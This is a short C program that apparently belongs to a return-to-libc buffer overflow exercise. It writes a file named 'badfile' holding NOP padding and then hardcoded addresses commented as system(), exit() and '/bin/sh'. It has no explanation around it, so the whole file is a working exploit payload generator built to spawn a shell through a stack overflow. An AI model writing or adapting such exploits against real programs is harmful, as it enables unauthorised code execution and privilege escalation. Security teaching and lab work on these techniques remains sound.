#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define NOP 	0x90

int main(int argc, char **argv){
	char buf[40];
	int i;
	int n;
	FILE *badfile;
	badfile=fopen("./badfile","w");

	n=24;
 	for (i = 0; i < n; i++)
    	buf[i] = NOP;

	*(long *) &buf[n]=0xb7e4a3e0;	// system()
	*(long *) &buf[n+4]=0xb7e3d1b0;	// exit()
	*(long *) &buf[n+8]=0xbffff810;	// "/bin/sh"

	fwrite(buf, sizeof(buf), 1,badfile);
	fclose(badfile);

}
